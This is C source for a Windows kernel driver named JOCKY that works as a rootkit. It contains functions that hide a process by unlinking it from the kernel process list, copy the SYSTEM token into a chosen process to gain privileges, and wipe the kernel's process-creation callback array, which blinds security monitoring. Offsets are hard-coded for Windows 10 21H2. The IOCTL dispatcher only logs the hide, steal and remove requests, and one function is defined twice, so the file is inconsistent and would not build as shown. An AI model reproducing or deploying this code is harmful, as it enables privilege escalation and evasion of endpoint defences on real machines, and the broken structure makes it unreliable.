#include <ntddk.h>
#include "IoctlCommon.h"
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

extern LIST_ENTRY PsLoadedModuleList;

ULONG_PTR GetNtoskrnlBase() {
    PLIST_ENTRY listHead = &PsLoadedModuleList;
    PLIST_ENTRY entry    = listHead->Flink;

    // First entry in PsLoadedModuleList is always ntoskrnl
    PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
        entry,
        LDR_DATA_TABLE_ENTRY,
        InLoadOrderLinks
    );

    DbgPrint("[JOCKY] ntoskrnl base: 0x%llX, name: %wZ\n",
             (ULONG_PTR)mod->DllBase, &mod->BaseDllName);

    return (ULONG_PTR)mod->DllBase;
}

ULONG_PTR FindPspCreateProcessNotifyRoutine() {
    ULONG_PTR ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        DbgPrint("[JOCKY] Failed to get ntoskrnl base\n");
        return 0;
    }


    UCHAR pattern[] = { 0x4C, 0x8D, 0x2D };
    ULONG_PTR scanEnd = ntBase + 0x1000000;

    for (ULONG_PTR addr = ntBase; addr < scanEnd - 7; addr++) {
        __try {
            UCHAR* bytes = (UCHAR*)addr;

            if (bytes[0] == pattern[0] &&
                bytes[1] == pattern[1] &&
                bytes[2] == pattern[2]) {

                // Extract 4-byte RIP-relative signed offset
                LONG ripOffset = *(LONG*)(addr + 3);

                // RIP points to next instruction (addr + 7)
                ULONG_PTR target = addr + 7 + (ULONG_PTR)ripOffset;

                // Sanity: must be within ntoskrnl
                if (target > ntBase && target < scanEnd) {
                    DbgPrint("[JOCKY] Candidate array at 0x%llX "
                             "(found at 0x%llX)\n", target, addr);
                    return target;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            // Skip faulting addresses
            continue;
        }
    }

    DbgPrint("[JOCKY] Pattern not found\n");
    return 0;
}

void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK_NAME);
    
    IoDeleteSymbolicLink(&symLink);
    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }
    
    DbgPrint("[JOCKY Driver] Unloaded successfully.\n");
}

NTSTATUS CreateCloseRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

NTSTATUS IoControlRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG bytesReturned = 0;

    ULONG ioctlCode = irpSp->Parameters.DeviceIoControl.IoControlCode;

    if (ioctlCode == IOCTL_JOCKY_PING) {
        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_PING from User-Mode Client!\n");
        status = STATUS_SUCCESS;

    } else if (ioctlCode == IOCTL_JOCKY_REMOVE_CALLBACKS) {
        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_REMOVE_CALLBACKS from User-Mode Client!\n");
        status = STATUS_SUCCESS;

    } else if (ioctlCode == IOCTL_JOCKY_HIDE_PROCESS) {
        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_HIDE_PROCESS from User-Mode Client!\n");
        status = STATUS_SUCCESS;

    } else if (ioctlCode == IOCTL_JOCKY_STEAL_TOKEN) {
        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_STEAL_TOKEN from User-Mode Client!\n");
        status = STATUS_SUCCESS;

    } else if (ioctlCode == IOCTL_JOCKY_ENUM_PROCS) {
        PROCESS_LIST* outBuf = (PROCESS_LIST*)Irp->AssociatedIrp.SystemBuffer;
        ULONG outBufLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

        if (outBuf && outBufLen >= sizeof(PROCESS_LIST)) {
            RtlZeroMemory(outBuf, sizeof(PROCESS_LIST));

            PEPROCESS proc = PsGetCurrentProcess();
            PEPROCESS startProc = proc;
            ULONG count = 0;

            do {
                if (count >= MAX_PROCESSES) break;

                ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(proc);
                PCHAR name = (PCHAR)PsGetProcessImageFileName(proc);

                outBuf->Entries[count].Pid = pid;
                RtlCopyMemory(outBuf->Entries[count].ImageName, name, 15);
                outBuf->Entries[count].ImageName[15] = '\0';
                count++;

                PLIST_ENTRY flink = (PLIST_ENTRY)((ULONG_PTR)proc + 0x448);
                proc = (PEPROCESS)((ULONG_PTR)flink->Flink - 0x448);

            } while (proc != startProc);

            outBuf->Count = count;
            bytesReturned = sizeof(PROCESS_LIST);
            status = STATUS_SUCCESS;
            DbgPrint("[JOCKY Driver] Enumerated %lu processes.\n", count);
        } else {
            status = STATUS_BUFFER_TOO_SMALL;
        }

    } else {
        DbgPrint("[JOCKY Driver] Unknown IOCTL code received: 0x%X\n", ioctlCode);
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    DbgPrint("[JOCKY Driver] IOCTL request completed with status: 0x%X, bytes returned: %lu\n", status, bytesReturned);
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    
    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;
    UNICODE_STRING devName, symLink;

    RtlInitUnicodeString(&devName, DEVICE_NAME_SYS);
    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK_NAME);

    status = IoCreateDevice(
        DriverObject,
        0,
        &devName,
        JOCKY_DEVICE_TYPE,
        0,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[JOCKY Driver] Failed to create device object (0x%X)\n", status);
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[JOCKY Driver] Failed to create symbolic link (0x%X)\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseRoutine;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseRoutine;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlRoutine;
    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[JOCKY Driver] Loaded successfully and device registered.\n");
    return STATUS_SUCCESS;
}

NTSTATUS JockyHideProcess(ULONG targetPid) {
    PEPROCESS proc = PsGetCurrentProcess();
    PEPROCESS startProc = proc;

    do {
        ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(proc);

        if (pid == targetPid) {
            // Found target — unlink from ActiveProcessLinks
            PLIST_ENTRY entry = (PLIST_ENTRY)(
                (ULONG_PTR)proc + 0x448
            );

            // Relink previous and next entries around this one
            entry->Blink->Flink = entry->Flink;
            entry->Flink->Blink = entry->Blink;

            // Point entry to itself — safe if anything walks it later
            entry->Flink = entry;
            entry->Blink = entry;

            DbgPrint("[JOCKY] Process PID %lu hidden from list\n",
                     targetPid);
            return STATUS_SUCCESS;
        }

        PLIST_ENTRY flink = (PLIST_ENTRY)(
            (ULONG_PTR)proc + 0x448
        );
        proc = (PEPROCESS)((ULONG_PTR)flink->Flink - 0x448);

    } while (proc != startProc);

    DbgPrint("[JOCKY] PID %lu not found\n", targetPid);
    return STATUS_NOT_FOUND;
}

// Win10 21H2 offsets
#define EPROCESS_TOKEN          0x4B8
#define EPROCESS_UNIQUEPID      0x440
#define EPROCESS_ACTIVELINKS    0x448

NTSTATUS JockyStealToken(ULONG targetPid) {
    PEPROCESS systemProc = NULL;
    PEPROCESS targetProc = NULL;

    // Get SYSTEM process (PID 4)
    NTSTATUS status = PsLookupProcessByProcessId(
        (HANDLE)4, &systemProc
    );
    if (!NT_SUCCESS(status)) {
        DbgPrint("[JOCKY] Failed to get SYSTEM process\n");
        return status;
    }

    // Get target process
    status = PsLookupProcessByProcessId(
        (HANDLE)(ULONG_PTR)targetPid, &targetProc
    );
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(systemProc);
        DbgPrint("[JOCKY] Failed to get target process\n");
        return status;
    }

    // Read SYSTEM token
    ULONG_PTR systemToken = *(ULONG_PTR*)(
        (ULONG_PTR)systemProc + EPROCESS_TOKEN
    );

    // Write SYSTEM token into target process
    // Mask off the RefCnt bits (bottom 4 bits) to get clean token value
    *(ULONG_PTR*)((ULONG_PTR)targetProc + EPROCESS_TOKEN) =
        (systemToken & ~0xFULL);

    DbgPrint("[JOCKY] SYSTEM token stolen into PID %lu\n", targetPid);

    ObDereferenceObject(systemProc);
    ObDereferenceObject(targetProc);
    return STATUS_SUCCESS;
}

// Pattern to find PspCreateProcessNotifyRoutine in ntoskrnl
// This works on Win10 21H2 — pattern may differ on other builds
// Found by scanning bytes around PsSetCreateProcessNotifyRoutine

ULONG_PTR FindPspCreateProcessNotifyRoutine() {
    // Get base of ntoskrnl
    ULONG_PTR ntBase = 0;

    // Walk loaded module list to find ntoskrnl base
    PLIST_ENTRY moduleList = (PLIST_ENTRY)PsLoadedModuleList;
    PLIST_ENTRY entry = moduleList->Flink;

    while (entry != moduleList) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
            entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );

        // ntoskrnl is the first entry in the list
        ntBase = (ULONG_PTR)mod->DllBase;
        break;
    }

    if (!ntBase) return 0;

    // Scan for the byte pattern that precedes the array
    // Pattern: 4C 8D 2D ?? ?? ?? ?? — lea r13, [PspCreateProcessNotifyRoutine]
    // This is inside PsSetCreateProcessNotifyRoutine
    UCHAR pattern[] = { 0x4C, 0x8D, 0x2D };
    ULONG_PTR scanStart = ntBase;
    ULONG_PTR scanEnd   = ntBase + 0x1000000; // scan 16MB

    for (ULONG_PTR addr = scanStart; addr < scanEnd - 7; addr++) {
        UCHAR* bytes = (UCHAR*)addr;

        if (bytes[0] == pattern[0] &&
            bytes[1] == pattern[1] &&
            bytes[2] == pattern[2]) {

            // Extract RIP-relative offset (bytes 3-6)
            LONG offset = *(LONG*)(addr + 3);

            // RIP at next instruction = addr + 7
            ULONG_PTR target = addr + 7 + offset;

            // Sanity check — must be in ntoskrnl range
            if (target > ntBase && target < scanEnd) {
                DbgPrint("[JOCKY] Found PspCreateProcessNotifyRoutine"
                         " at 0x%llX\n", target);
                return target;
            }
        }
    }

    return 0;
}

NTSTATUS JockyRemoveCallbacks() {
    ULONG_PTR arrayBase = FindPspCreateProcessNotifyRoutine();
    if (!arrayBase) {
        DbgPrint("[JOCKY] Failed to find callback array\n");
        return STATUS_NOT_FOUND;
    }

    // Array has 64 EX_CALLBACK_ROUTINE_BLOCK* entries
    // Each is a pointer — if non-null, a callback is registered
    // Low bits are used as flags — mask them off to get real pointer
    ULONG removed = 0;

    for (int i = 0; i < 64; i++) {
        ULONG_PTR* slot = (ULONG_PTR*)(arrayBase + i * sizeof(ULONG_PTR));
        ULONG_PTR entry = *slot;

        if (entry != 0) {
            // Get actual pointer (mask off low 4 bits)
            ULONG_PTR cleanPtr = entry & ~0xFULL;

            if (cleanPtr) {
                // Zero out the slot — callback is removed
                *slot = 0;
                removed++;
                DbgPrint("[JOCKY] Removed callback at slot %d\n", i);
            }
        }
    }

    DbgPrint("[JOCKY] Removed %lu process notify callbacks\n", removed);
    return STATUS_SUCCESS;
}